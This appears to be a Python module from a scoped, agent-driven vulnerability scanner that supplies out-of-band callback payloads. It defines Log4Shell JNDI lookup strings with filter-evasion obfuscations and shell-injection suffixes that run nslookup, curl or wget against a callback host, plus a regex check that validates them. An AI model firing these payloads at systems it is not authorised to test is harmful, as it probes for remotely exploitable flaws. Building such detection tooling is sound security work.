"""Server-owned callback payload templates for run_oob_callback_workflow.

Templates carry ``{{callback_host}}`` and are filled with a fresh
registration's host by ``oob_callback_workflow``. The agent picks a template
by name; it never supplies the bytes.

What a correlated callback shows:

* **JNDI (Log4Shell-style)**: something on the server evaluated a
  ``${jndi:...}`` lookup and resolved or contacted the callback host. That is
  an outbound lookup triggered by input (file under ``ssrf``). It does not
  show code execution: no class is served or loaded here.
* **curl / wget / nslookup command callbacks**: the injected shell command ran
  and made a DNS lookup or HTTP request to the callback host (file under
  ``command_injection``; ``proof_policy`` requires one of these commands next
  to the host in the planted request).

One template per call, so one registration maps to one payload.
"""

from __future__ import annotations

import re

from app.services.agent.oob_callback_workflow import CALLBACK_HOST_PLACEHOLDER as _H

# Log4j lookup variants. "plain" is the canonical form; the others are common
# filter-evasion spellings that Log4j resolves to the same ldap/dns lookup.
JNDI_VARIANTS: dict[str, str] = {
    "plain": "${jndi:ldap://" + _H + "/p}",
    "dns": "${jndi:dns://" + _H + "/d}",
    "lower": "${${lower:j}ndi:${lower:l}dap://" + _H + "/l}",
    "upper": "${${upper:j}ndi:${upper:l}dap://" + _H + "/u}",
    "default_value": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + _H + "/v}",
    "env_fallback": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//" + _H + "/e}",
}
JNDI_LOCATIONS = frozenset({"query", "header", "body_json", "body_form"})

CMDI_COMMANDS = ("nslookup", "curl", "wget")
CMDI_SHELLS = ("posix_subshell", "posix_separator", "windows_separator")

_COMMAND_BODIES: dict[str, dict[str, str]] = {
    "nslookup": {
        "posix": "nslookup " + _H,
        "windows": "nslookup " + _H,
    },
    "curl": {
        "posix": "curl -s -o /dev/null http://" + _H + "/c",
        # curl.exe ships with Windows 10 1803+.
        "windows": "curl -s http://" + _H + "/c",
    },
    "wget": {
        "posix": "wget -q -O /dev/null http://" + _H + "/w",
    },
}
_WRAP = {
    "posix_subshell": ("posix", "$({})"),
    "posix_separator": ("posix", ";{};"),
    "windows_separator": ("windows", "&{}&"),
}


def jndi_template(variant: str) -> str:
    """One bounded JNDI lookup string carrying ``{{callback_host}}``."""
    key = (variant or "").strip().lower()
    if key not in JNDI_VARIANTS:
        raise ValueError(f"unsupported_jndi_variant (use one of {', '.join(JNDI_VARIANTS)})")
    return JNDI_VARIANTS[key]


def cmdi_suffix(shell: str, command: str = "nslookup") -> str:
    """The injected command (with shell separators) carrying ``{{callback_host}}``."""
    if shell not in CMDI_SHELLS:
        raise ValueError("unsupported_cmdi_shell")
    command = (command or "nslookup").strip().lower()
    if command not in CMDI_COMMANDS:
        raise ValueError("unsupported_cmdi_command")
    family, wrap = _WRAP[shell]
    body = _COMMAND_BODIES[command].get(family)
    if body is None:
        raise ValueError(f"{command} is not available for {shell}")
    return wrap.format(body)


def plan_oob_cmdi_command(url: str, *, parameter: str, shell: str,
                          command: str = "nslookup") -> tuple[str, str]:
    """``(field, template)`` for a query_template probe: observed value + command."""
    from app.services.agent.scoped_assessment.sqli_oob import observed_value

    suffix = cmdi_suffix(shell, command)
    return parameter, observed_value(url, parameter=parameter) + suffix


_SEP = r"(?:\s|\+|%20)+"


def cmdi_callback_in_request(request_text: str, domain: str) -> bool:
    """True when the planted request runs nslookup/curl/wget against ``domain``.

    Keeps a URL-fetch (SSRF) callback from passing as command injection: the
    host must follow one of the server-owned callback commands.
    """
    if not domain:
        return False
    host = re.escape(domain)
    lookup = r"\bnslookup" + _SEP + r"[\w.-]*" + host
    fetch = r"\b(?:curl|wget)" + _SEP + r"[^;&|`$()\"]{0,80}?https?://[\w.-]*" + host
    return bool(re.search(lookup, request_text) or re.search(fetch, request_text))
